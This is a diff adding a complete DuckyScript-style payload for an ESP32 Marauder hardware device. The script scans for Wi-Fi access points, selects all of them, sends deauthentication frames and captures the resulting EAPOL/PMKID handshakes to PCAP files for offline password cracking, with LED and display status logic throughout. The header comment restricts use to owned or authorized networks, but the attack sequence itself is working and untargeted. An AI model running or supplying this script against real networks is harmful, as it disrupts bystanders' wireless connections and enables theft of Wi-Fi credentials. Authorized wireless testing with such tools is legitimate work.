@@ -1,0 +1,88 @@
+REM WiFi deauth and crypto capture with LED status indicators.
+REM Only use against networks you own or have explicit permission to test.
+REM Dim amber: waiting for operator input.
+LED 35 100 100 50
+DISPLAY_CLEAR
+DISPLAY_TEXT 0 0 Press button to start
+WAIT_FOR_BUTTON_PRESS
+WEB_OFF
+REM Enable Marauder packet/PCAP output so EAPOL captures are written as eapol_N.pcap.
+LED 35 100 100 180
+DISPLAY_CLEAR
+DISPLAY_TEXT 0 0 Enabling PCAP output
+ESP32M settings -s SavePCAP enable
+DELAY 500
+REM First we need to get a list of APs to target.
+DISPLAY_CLEAR
+DISPLAY_TEXT 0 0 Scanning for APs (20s)
+ESP32M scanap
+VAR $SCAN_BLINKS = 0
+WHILE ($SCAN_BLINKS != 20)
+    LED 35 100 100 180
+    DELAY 500
+    LED_OFF
+    DELAY 500
+    $SCAN_BLINKS = ( $SCAN_BLINKS + 1 )
+END_WHILE
+ESP32M stopscan
+DELAY 500
+LED 100 100 100 255
+DISPLAY_TEXT 0 10 Scan finished
+DELAY 250
+REM Next we can deauth anything connected to the AP and sniff the crypto handshakes.
+DISPLAY_TEXT 0 20 Deauthing!
+REM https://github.com/justcallmekoko/ESP32Marauder/wiki/sniffpmkid
+ESP32M select -a all
+DELAY 500
+ESP32M sniffpmkid -l -d
+DELAY 500
+LED 240 100 100 180
+DISPLAY_TEXT 0 40 Long press to stop
+VAR $SCREEN_X_POS = 0
+VAR $LED_HEARTBEAT = 0
+WHILE (TRUE)
+    REM The following prints a little status bar for every packet received.
+    IF (ESP32M_GET_RECV_PACKETS() != 0)
+        REM Bright green pulse: packet activity observed.
+        LED 100 100 100 255
+        DISPLAY_TEXT $SCREEN_X_POS 50 .
+        $SCREEN_X_POS = ( $SCREEN_X_POS + 1 )
+        IF ($SCREEN_X_POS >= #_DISPLAY_WIDTH_)
+            DISPLAY_CLEAR
+            DISPLAY_TEXT 0 0 Scanning for APs (20s)
+            DISPLAY_TEXT 0 10 Scan finished
+            DISPLAY_TEXT 0 20 Deauthing!
+            DISPLAY_TEXT 0 40 Long press to stop
+            $SCREEN_X_POS = 0
+        END_IF
+        DELAY 100
+        LED 240 100 100 180
+        $LED_HEARTBEAT = 0
+    ELSE
+        IF ($LED_HEARTBEAT == 0)
+            REM Dim blue: deauth/sniff loop is running.
+            LED 240 100 100 50
+            $LED_HEARTBEAT = 1
+        ELSE
+            REM Bright blue: deauth/sniff loop heartbeat.
+            LED 240 100 100 180
+            $LED_HEARTBEAT = 0
+        END_IF
+    END_IF
+    WAIT_FOR_BUTTON_PRESS_OR_TIMEOUT 900
+    IF (BUTTON_LONG_PRESS())
+        DISPLAY_CLEAR
+        REM Red: stopping ESP32Marauder scan/sniffing.
+        LED 0 100 100 180
+        ESP32M stopscan
+        DELAY 1000
+        REM Steady green: attack complete, waiting for reset.
+        LED 100 100 100 80
+        DISPLAY_TEXT 0 0 Attack complete
+        DISPLAY_TEXT 0 10 PCAP: eapol_N.pcap
+        DISPLAY_TEXT 0 20 Press again to reset
+        WAIT_FOR_BUTTON_PRESS
+        LED_OFF
+        RESET
+    END_IF
+END_WHILE
